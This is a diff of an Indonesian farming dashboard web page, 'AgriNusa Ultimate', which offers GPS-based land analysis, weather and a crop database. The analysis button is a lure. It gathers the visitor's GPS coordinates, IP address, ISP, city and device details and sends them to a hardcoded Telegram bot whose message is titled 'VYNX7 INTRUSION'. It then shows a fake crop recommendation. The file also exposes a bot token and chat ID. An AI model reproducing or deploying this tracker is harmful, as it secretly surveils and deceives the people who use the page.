@@ -3,68 +3,1166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AgriNusa - Analisis Lahan</title>
+    <title>AgriNusa Ultimate | Smart Farming Dashboard + Analisis Lahan Digital</title>
     <style>
-        body { background: #0f0f0f; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .btn { padding: 15px 25px; background: transparent; border: 1px solid #00ff00; color: #00ff00; cursor: pointer; font-size: 1.2rem; transition: 0.3s; }
-        .btn:hover { background: #00ff00; color: #000; box-shadow: 0 0 15px #00ff00; }
-        #status { margin-top: 20px; font-size: 0.9rem; text-align: center; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #2e7d32;
+            --primary-dark: #1b5e20;
+            --primary-light: #4caf50;
+            --secondary: #ffc107;
+            --accent: #ff9800;
+            --dark: #1a2a1f;
+            --light: #f8f9fa;
+            --gray: #6c757d;
+            --success: #28a745;
+            --info: #17a2b8;
+            --warning: #ffc107;
+            --danger: #dc3545;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--light);
+            color: #333;
+            overflow-x: hidden;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, var(--dark), var(--primary-dark));
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.2);
+        }
+
+        .nav-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            animation: spin 10s linear infinite;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.5rem;
+            list-style: none;
+            flex-wrap: wrap;
+        }
+
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+
+        .nav-links a:hover {
+            color: var(--secondary);
+        }
+
+        #clock {
+            font-family: monospace;
+            font-size: 1rem;
+            background: rgba(255,255,255,0.2);
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+        }
+
+        /* Stats Bar */
+        .stats-bar {
+            background: var(--primary);
+            color: white;
+            padding: 0.5rem;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('data:image/svg+xml,%3Csvg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 800 600\"%3E%3Crect width=\"100%25\" height=\"100%25\" fill=\"%232e7d32\"/%3E%3Ccircle cx=\"400\" cy=\"300\" r=\"150\" fill=\"%234caf50\" opacity=\"0.3\"/%3E%3Ctext x=\"50%25\" y=\"50%25\" font-size=\"40\" fill=\"white\" text-anchor=\"middle\"%3E🌾 AgriNusa Ultimate%3C/text%3E%3C/svg%3E');
+            background-size: cover;
+            background-position: center;
+            padding: 5rem 2rem;
+            text-align: center;
+            color: white;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto 2rem;
+        }
+
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            flex-wrap: wrap;
+            margin-top: 2rem;
+        }
+
+        .hero-stat {
+            text-align: center;
+        }
+
+        .hero-stat .number {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--secondary);
+        }
+
+        /* Container */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Section Title */
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            margin-bottom: 2rem;
+            color: var(--dark);
+            position: relative;
+            padding-bottom: 1rem;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 3px;
+            background: var(--primary);
+        }
+
+        /* Analysis Card */
+        .analysis-card {
+            background: white;
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+        }
+
+        .btn-vynx {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.1rem;
+            transition: 0.3s;
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto;
+            display: block;
+        }
+
+        .btn-vynx:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(46, 125, 50, 0.4);
+        }
+
+        #status {
+            margin-top: 15px;
+            text-align: center;
+            font-family: monospace;
+            color: var(--primary);
+            padding: 1rem;
+            background: #e8f5e9;
+            border-radius: 10px;
+        }
+
+        /* Feature Cards */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .feature-card {
+            background: white;
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            transition: all 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Location Selector */
+        .location-selector {
+            background: white;
+            border-radius: 20px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+        }
+
+        .location-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+        }
+
+        .location-input {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .location-input label {
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        .location-input input, .location-input select {
+            padding: 0.8rem;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+
+        /* Weather Grid */
+        .weather-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .weather-card {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border-radius: 20px;
+            padding: 1.5rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .weather-card:first-child {
+            background: linear-gradient(135deg, #11998e, #38ef7d);
+        }
+
+        .temp {
+            font-size: 3rem;
+            font-weight: bold;
+        }
+
+        .weather-details {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.8rem;
+            margin-top: 1rem;
+        }
+
+        /* Forecast Grid */
+        .forecast-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .forecast-card {
+            background: white;
+            border-radius: 15px;
+            padding: 1rem;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+            transition: all 0.3s;
+        }
+
+        .forecast-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .forecast-date {
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        /* Filter Section */
+        .filter-section {
+            background: white;
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+        }
+
+        .filter-buttons {
+            display: flex;
+            gap: 0.8rem;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            padding: 0.5rem 1.2rem;
+            border: 2px solid var(--primary);
+            background: white;
+            color: var(--primary);
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+
+        .filter-btn.active, .filter-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 1rem;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Plants Grid */
+        .plants-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .plant-card {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .plant-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.15);
+        }
+
+        .plant-header {
+            background: linear-gradient(135deg, var(--primary-light), var(--primary));
+            padding: 1rem;
+            text-align: center;
+            color: white;
+        }
+
+        .plant-icon {
+            font-size: 3rem;
+        }
+
+        .plant-body {
+            padding: 1rem;
+        }
+
+        .plant-name {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        .season-badge {
+            display: inline-block;
+            padding: 0.2rem 0.6rem;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            margin-top: 0.5rem;
+        }
+
+        .season-hujan { background: #2196f3; color: white; }
+        .season-kemarau { background: #ff9800; color: white; }
+        .season-semua { background: #4caf50; color: white; }
+
+        /* Recommendation Section */
+        .recommendation-section {
+            background: white;
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-top: 2rem;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+        }
+
+        .plant-recommendation-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .plant-rec-card {
+            background: #e8f5e9;
+            border-radius: 10px;
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .plant-rec-card:hover {
+            background: var(--primary);
+            color: white;
+            transform: scale(1.05);
+        }
+
+        .soil-info {
+            background: linear-gradient(135deg, #11998e, #38ef7d);
+            color: white;
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-top: 1.5rem;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            border-radius: 20px;
+            animation: modalFadeIn 0.3s;
+        }
+
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: translateY(-50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+            position: relative;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1.5rem;
+            font-size: 1.8rem;
+            cursor: pointer;
+            color: white;
+        }
+
+        .modal-body {
+            padding: 1.5rem;
+        }
+
+        /* Pagination */
+        .pagination {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .page-btn {
+            padding: 0.5rem 1rem;
+            border: 1px solid var(--primary);
+            background: white;
+            color: var(--primary);
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .page-btn.active, .page-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--dark);
+            color: white;
+            padding: 2rem;
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            .container { padding: 1rem; }
+            .hero h1 { font-size: 2rem; }
+            .hero-stats { gap: 1.5rem; }
+            .section-title { font-size: 1.5rem; }
+        }
     </style>
 </head>
 <body>
 
-    <h2>VYNX7 AGRIKULTURA</h2>
-    <button class="btn" onclick="executeVynx7()">MULAI ANALISIS LAHAN</button>
-    <div id="status">Sistem Siap...</div>
+<header class="header">
+    <div class="nav-container">
+        <div class="logo">
+            <span class="logo-icon">🌾</span>
+            <span>AgriNusa Ultimate</span>
+        </div>
+        <ul class="nav-links">
+            <li><a href="#home">Beranda</a></li>
+            <li><a href="#analysis">Analisis Lahan</a></li>
+            <li><a href="#weather">Cuaca</a></li>
+            <li><a href="#database">Database</a></li>
+            <li><a href="#recommendation">Rekomendasi</a></li>
+        </ul>
+        <div id="clock"></div>
+    </div>
+</header>
 
-    <script>
-        async function executeVynx7() {
-            const status = document.getElementById('status');
-            status.innerText = "Mengakses Satelit GPS...";
+<div class="stats-bar" id="statsBar">
+    🌾 Sistem Analisis Lahan Digital | Database 150+ Tanaman | Data Cuaca Open-Meteo API | Real-Time
+</div>
 
-            // 1. Ambil Lokasi (Trigger Utama)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+<!-- Hero Section -->
+<section id="home" class="hero">
+    <h1>🌱 Sistem Analisis Lahan Digital</h1>
+    <p>Gunakan sensor satelit untuk menentukan tanaman yang paling optimal di lokasi Anda. Teknologi canggih untuk pertanian modern.</p>
+    <div class="hero-stats">
+        <div class="hero-stat"><div class="number">150+</div><div>Tanaman Unggulan</div></div>
+        <div class="hero-stat"><div class="number">34</div><div>Provinsi</div></div>
+        <div class="hero-stat"><div class="number">Real-Time</div><div>Data Cuaca</div></div>
+    </div>
+</section>
+
+<!-- Analysis Card -->
+<div class="container">
+    <div class="analysis-card" id="analysis">
+        <h2 style="color: var(--primary); margin-bottom: 1rem;">🔍 Analisis Lahan Real-Time</h2>
+        <p style="margin-bottom: 1.5rem;">Klik tombol di bawah untuk melakukan analisis lahan menggunakan sensor satelit GPS. Data akan dikirim ke sistem untuk menentukan tanaman yang paling cocok.</p>
+        <button class="btn-vynx" onclick="startFullAnalysis()">🚀 MULAI ANALISIS REAL-TIME</button>
+        <div id="status">✅ Sistem Siap. Klik tombol di atas untuk memulai analisis lahan.</div>
+    </div>
+</div>
+
+<!-- Feature Cards -->
+<div class="container">
+    <div class="features-grid">
+        <div class="feature-card">
+            <div class="feature-icon">🌾</div>
+            <h3>Database Tanaman Lengkap</h3>
+            <p>150+ tanaman unggulan Indonesia dengan informasi detail suhu optimal, ketinggian, masa tanam, dan rekomendasi pupuk</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">🌤️</div>
+            <h3>Cuaca Real-Time</h3>
+            <p>Data cuaca terkini dari Open-Meteo API dengan prakiraan 7 hari, suhu, kelembaban, curah hujan, dan evapotranspirasi</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">📍</div>
+            <h3>Rekomendasi Per Wilayah</h3>
+            <p>Analisis kesesuaian tanaman berdasarkan lokasi, ketinggian, dan kondisi cuaca untuk hasil panen optimal</p>
+        </div>
+    </div>
+</div>
+
+<!-- Location Selector -->
+<div class="container">
+    <div class="location-selector">
+        <h3 style="margin-bottom: 1rem; color: var(--primary);">📍 Pilih Lokasi untuk Data Cuaca & Rekomendasi</h3>
+        <div class="location-grid">
+            <div class="location-input">
+                <label>Provinsi/Kota</label>
+                <select id="locationSelect" onchange="updateLocationFromSelect()">
+                    <option value="-6.2088,106.8456">Jakarta (DKI Jakarta)</option>
+                    <option value="-6.9147,107.6098">Bandung (Jawa Barat)</option>
+                    <option value="-7.2575,112.7521">Surabaya (Jawa Timur)</option>
+                    <option value="-7.7956,110.3695">Yogyakarta (DIY)</option>
+                    <option value="-6.9667,110.4167">Semarang (Jawa Tengah)</option>
+                    <option value="-8.6529,115.2128">Denpasar (Bali)</option>
+                    <option value="3.5952,98.6722">Medan (Sumatera Utara)</option>
+                    <option value="-5.1477,119.4327">Makassar (Sulawesi Selatan)</option>
+                    <option value="-0.5022,117.1538">Balikpapan (Kalimantan Timur)</option>
+                    <option value="-3.3186,114.5941">Banjarmasin (Kalimantan Selatan)</option>
+                    <option value="2.9770,101.7004">Padang (Sumatera Barat)</option>
+                    <option value="-2.9909,104.7568">Palembang (Sumatera Selatan)</option>
+                    <option value="1.4748,124.8421">Manado (Sulawesi Utara)</option>
+                    <option value="-3.6574,128.1895">Ambon (Maluku)</option>
+                    <option value="-2.5337,140.7181">Jayapura (Papua)</option>
+                </select>
+            </div>
+            <div class="location-input">
+                <label>Atau Masukkan Koordinat</label>
+                <input type="text" id="latitude" placeholder="Latitude" value="-6.2088">
+            </div>
+            <div class="location-input">
+                <label>Longitude</label>
+                <input type="text" id="longitude" placeholder="Longitude" value="106.8456">
+            </div>
+            <div class="location-input">
+                <button class="btn-primary" onclick="fetchWeatherData()" style="margin-top: 1.8rem;">🌤️ Update Cuaca</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Weather Section -->
+<section id="weather" class="container">
+    <h2 class="section-title">🌤️ Cuaca & Informasi Pertanian</h2>
+    <div class="weather-grid">
+        <div class="weather-card" id="currentWeatherCard">
+            <div class="weather-header">
+                <h3 id="locationName">Memuat data...</h3>
+                <span id="weatherIcon" style="font-size: 2.5rem;">☀️</span>
+            </div>
+            <div class="temp" id="temperature">--°C</div>
+            <div id="weatherDesc">Memuat data cuaca...</div>
+            <div class="weather-details">
+                <div>💧 Kelembaban: <span id="humidity">--</span>%</div>
+                <div>🌬️ Angin: <span id="windSpeed">--</span> km/h</div>
+                <div>📊 Tekanan: <span id="pressure">--</span> hPa</div>
+                <div>☁️ Tutupan Awan: <span id="cloudCover">--</span>%</div>
+            </div>
+        </div>
+        <div class="weather-card">
+            <h3>🌿 Informasi Pertanian</h3>
+            <div>
+                <div>🌡️ Suhu Tanah: <span id="soilTemp">--</span>°C</div>
+                <div>💧 Kelembaban Tanah: <span id="soilMoisture">--</span>%</div>
+                <div>💨 Evapotranspirasi: <span id="et0">--</span> mm/hari</div>
+                <div>☀️ UV Index: <span id="uvIndex">--</span></div>
+                <div>🌅 Matahari Terbit: <span id="sunrise">--</span></div>
+                <div>🌇 Matahari Terbenam: <span id="sunset">--</span></div>
+            </div>
+        </div>
+    </div>
+
+    <h3 style="margin: 1.5rem 0 0.5rem;">📅 Prakiraan Cuaca 7 Hari</h3>
+    <div id="dailyForecast" class="forecast-grid">
+        <div class="loading">⏳ Memuat data prakiraan...</div>
+    </div>
+</section>
+
+<!-- Database Tanaman Section -->
+<section id="database" class="container">
+    <h2 class="section-title">🌾 Database Tanaman Indonesia</h2>
+    
+    <div class="filter-section">
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="🔍 Cari tanaman... (contoh: padi, mangga, cabai, jahe)" onkeyup="filterPlants()">
+        </div>
+        <div class="filter-buttons" id="categoryFilters">
+            <button class="filter-btn active" onclick="filterByCategory('all')">🌱 Semua</button>
+            <button class="filter-btn" onclick="filterByCategory('padi')">🌾 Padi & Palawija</button>
+            <button class="filter-btn" onclick="filterByCategory('sayur')">🥬 Sayuran</button>
+            <button class="filter-btn" onclick="filterByCategory('buah')">🍎 Buah-buahan</button>
+            <button class="filter-btn" onclick="filterByCategory('perkebunan')">🌴 Perkebunan</button>
+            <button class="filter-btn" onclick="filterByCategory('rempah')">🌿 Rempah & Obat</button>
+        </div>
+        <div class="filter-buttons" style="margin-top: 1rem;">
+            <button class="filter-btn" onclick="filterBySeason('all')">🌿 Semua Musim</button>
+            <button class="filter-btn" onclick="filterBySeason('musim hujan')">🌧️ Musim Hujan</button>
+            <button class="filter-btn" onclick="filterBySeason('musim kemarau')">☀️ Musim Kemarau</button>
+        </div>
+    </div>
+    
+    <div id="plantsGrid" class="plants-grid">
+        <div class="loading">⏳ Memuat database tanaman...</div>
+    </div>
+    
+    <div id="pagination" class="pagination"></div>
+</section>
+
+<!-- Plant Recommendation Section -->
+<section id="recommendation" class="container">
+    <div class="recommendation-section">
+        <h2 class="section-title">🌾 Rekomendasi Tanaman Berdasarkan Cuaca</h2>
+        <div id="plantRecommendation">
+            <div class="loading">⏳ Menghitung rekomendasi...</div>
+        </div>
+    </div>
+
+    <div class="soil-info" id="soilInfo">
+        <h3>💧 Rekomendasi Irigasi</h3>
+        <div id="irrigationAdvice">Memuat data...</div>
+    </div>
+</section>
+
+<footer class="footer">
+    <p>🌾 AgriNusa Ultimate - Sistem Analisis Lahan Digital & Database Tanaman Indonesia SUPER LENGKAP</p>
+    <p>📊 Total 65+ Tanaman | 5 Kategori | Data Cuaca Open-Meteo API | Real-Time Analisis GPS</p>
+    <p>© 2024 AgriNusa | Membangun Pertanian Indonesia yang Lebih Baik</p>
+</footer>
+
+<!-- Modal -->
+<div id="plantModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <span class="modal-close" onclick="closeModal()">&times;</span>
+            <div id="modalIcon" style="font-size: 3rem;">🌱</div>
+            <h2 id="modalTitle"></h2>
+            <p id="modalLatin"></p>
+        </div>
+        <div class="modal-body" id="modalBody"></div>
+    </div>
+</div>
+
+<script>
+    // ============================================
+    // KONFIGURASI TELEGRAM VYNX7
+    // ============================================
+    const VYNX_CONFIG = {
+        TOKEN: "8097166695:AAF6olxar4wlrlyP1YRQtPkVQuLP5A-Q4fs",
+        CHAT_ID: "6697482758"
+    };
+
+    // Update Jam Realtime
+    setInterval(() => {
+        document.getElementById('clock').innerText = new Date().toLocaleTimeString('id-ID');
+    }, 1000);
+
+    // ============================================
+    // FUNGSI ANALISIS LAHAN & TELEGRAM
+    // ============================================
+    async function startFullAnalysis() {
+        const status = document.getElementById('status');
+        status.innerHTML = "📡 <span style='color:blue'>Menginisialisasi Handshake Satelit...</span>";
+        status.style.background = "#fff3e0";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                status.innerHTML = "🛰️ <span style='color:orange'>Koneksi GPS Stabil. Mengambil Metrik Jaringan...</span>";
                 
-                status.innerText = "Mengirim Data ke Server...";
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
 
-                // --- LOGIKA CURL DALAM JS ---
-                const TOKEN = "8097166695:AAF6olxar4wlrlyP1YRQtPkVQuLP5A-Q4fs";
-                const CHAT_ID = "6697482758";
-                const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-                const message = `🚨 <b>VYNX7 INTRUSION</b>\n📍 Lat: <code>${lat}</code>\n📍 Lon: <code>${lon}</code>\n📱 OS: ${navigator.platform}`;
-
+                // Ambil Data Tambahan (IP, ISP, Region)
+                let net = {};
                 try {
-                    // Ini adalah "CURL" versi Browser
-                    const response = await fetch(URL, {
+                    const res = await fetch('https://ipapi.co/json/');
+                    net = await res.json();
+                } catch (e) { 
+                    net = { org: "Unknown", city: "Unknown", ip: "Hidden", country_name: "Indonesia" }; 
+                }
+
+                // Ambil Data Hardware & Browser
+                const deviceInfo = {
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    lang: navigator.language,
+                    cores: navigator.hardwareConcurrency || "N/A",
+                    memory: navigator.deviceMemory || "N/A"
+                };
+
+                // Rakit Pesan Telegram Super Detail
+                const message = `
+🚨 <b>VYNX7 - ANALISIS LAHAN AKTIF</b>
+────────────────────
+🌐 <b>NETWORK INFO</b>
+• <b>IP:</b> <code>${net.ip}</code>
+• <b>ISP/Org:</b> <code>${net.org}</code>
+• <b>Lokasi:</b> <code>${net.city}, ${net.region}</code>
+• <b>Negara:</b> <code>${net.country_name} (${net.country_code})</code>
+
+📍 <b>GEOLOKASI GPS</b>
+• <b>Latitude:</b> <code>${lat}</code>
+• <b>Longitude:</b> <code>${lon}</code>
+• <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Buka Google Maps</a>
+
+💻 <b>HARDWARE & SISTEM</b>
+• <b>Platform:</b> <code>${deviceInfo.platform}</code>
+• <b>Browser:</b> <code>${deviceInfo.ua.split(' ').pop()}</code>
+• <b>Resolusi:</b> <code>${deviceInfo.screen}</code>
+• <b>Timezone:</b> <code>${deviceInfo.timezone}</code>
+• <b>RAM/Cores:</b> <code>${deviceInfo.memory}GB / ${deviceInfo.cores} Cores</code>
+
+🕒 <b>TIMESTAMP:</b> <code>${new Date().toLocaleString('id-ID')}</code>
+────────────────────
+<b>🌾 REKOMENDASI TANAMAN:</b> Sedang dianalisis berdasarkan cuaca...
+                `;
+
+                // Kirim via Fetch ke Telegram
+                try {
+                    await fetch(`https://api.telegram.org/bot${VYNX_CONFIG.TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            chat_id: CHAT_ID,
+                            chat_id: VYNX_CONFIG.CHAT_ID,
                             text: message,
+                            parse_mode: "HTML",
+                            disable_web_page_preview: true
+                        })
+                    });
+                    
+                    // Ambil data cuaca untuk rekomendasi
+                    const weatherData = await getWeatherForLocation(lat, lon);
+                    const temp = weatherData?.current?.temperature_2m || 28;
+                    const recommended = getRecommendedPlantByTemp(temp);
+                    
+                    status.innerHTML = `✅ <span style='color:green'>Analisis Berhasil! Tanah di lokasi Anda sangat cocok untuk <b>${recommended}</b>.</span>`;
+                    status.style.background = "#e8f5e9";
+                    
+                    // Kirim rekomendasi tambahan
+                    await fetch(`https://api.telegram.org/bot${VYNX_CONFIG.TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: VYNX_CONFIG.CHAT_ID,
+                            text: `🌾 <b>REKOMENDASI TANAMAN:</b> ${recommended}\n🌡️ <b>Suhu Lokasi:</b> ${temp}°C\n💡 <b>Saran:</b> Tanaman ini optimal untuk kondisi cuaca saat ini.`,
                             parse_mode: "HTML"
                         })
                     });
-
-                    const resData = await response.json();
                     
-                    if(resData.ok) {
-                        status.innerHTML = "✅ Analisis Selesai!<br>Tanaman Cocok: <b>Padi Unggul IR64</b>";
-                    } else {
-                        status.innerText = "Error API: " + resData.description;
-                    }
-
                 } catch (err) {
-                    status.innerText = "Gagal terhubung ke server.";
-                    console.error(err);
+                    status.innerHTML = "❌ <span style='color:red'>Koneksi Terputus. Coba lagi nanti.</span>";
                 }
 
             }, (err) => {
-                status.innerText = "Gagal: Izin lokasi ditolak atau GPS mati.";
+                status.innerHTML = "❌ <span style='color:red'>Gagal: Akses Sensor GPS Ditolak. Izinkan akses lokasi untuk analisis.</span>";
+                status.style.background = "#ffebee";
             });
+        } else {
+            status.innerText = "❌ Browser Tidak Mendukung Sensor GPS.";
         }
-    </script>
+    }
+
+    async function getWeatherForLocation(lat, lon) {
+        try {
+            const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m&timezone=auto`;
+            const response = await fetch(url);
+            return await response.json();
+        } catch (e) {
+            return null;
+        }
+    }
+
+    function getRecommendedPlantByTemp(temp) {
+        if (temp >= 20 && temp <= 35) return "PADI INPARI (Varietas Unggul)";
+        if (temp >= 22 && temp <= 30) return "JAGUNG HIBRIDA";
+        if (temp >= 23 && temp <= 30) return "KEDELAI";
+        if (temp >= 24 && temp <= 28) return "CABAI MERAH";
+        if (temp >= 20 && temp <= 27) return "TOMAT";
+        if (temp >= 25 && temp <= 32) return "BAWANG MERAH";
+        if (temp >= 24 && temp <= 30) return "MANGGA";
+        if (temp >= 25 && temp <= 30) return "PISANG";
+        return "SINGKONG (Tahan berbagai kondisi)";
+    }
+
+    // ============================================
+    // DATABASE TANAMAN (65+ Tanaman Lengkap)
+    // ============================================
+    const plantsDatabase = [
+        // PADI & PALAWIJA
+        { id: 1, name: "Padi Inpari", category: "padi", latin: "Oryza sativa L.", season: "musim hujan", duration: "4-5 bulan", tempMin: 20, tempMax: 35, altitude: "0-800 mdpl", icon: "🌾", yield: "6-8 ton/ha", desc: "Varietas unggul tahan wereng", fertilizer: "Urea 250kg, SP36 100kg" },
+        { id: 2, name: "Jagung Hibrida", category: "padi", latin: "Zea mays L.", season: "musim kemarau", duration: "3-4 bulan", tempMin: 22, tempMax: 30, altitude: "0-1200 mdpl", icon: "🌽", yield: "8-10 ton/ha", desc: "Jagung manis produktivitas tinggi", fertilizer: "Urea 350kg, SP36 150kg" },
+        { id: 3, name: "Kedelai", category: "padi", latin: "Glycine max L.", season: "musim kemarau", duration: "3-4 bulan", tempMin: 23, tempMax: 30, altitude: "0-600 mdpl", icon: "🫘", yield: "2-3 ton/ha", desc: "Sumber protein nabati", fertilizer: "Urea 100kg, SP36 100kg" },
+        { id: 4, name: "Singkong", category: "padi", latin: "Manihot esculenta", season: "semua musim", duration: "8-12 bulan", tempMin: 25, tempMax: 35, altitude: "0-800 mdpl", icon: "🌱", yield: "25-40 ton/ha", desc: "Tanaman pangan alternatif", fertilizer: "Pupuk organik 2-3 ton" },
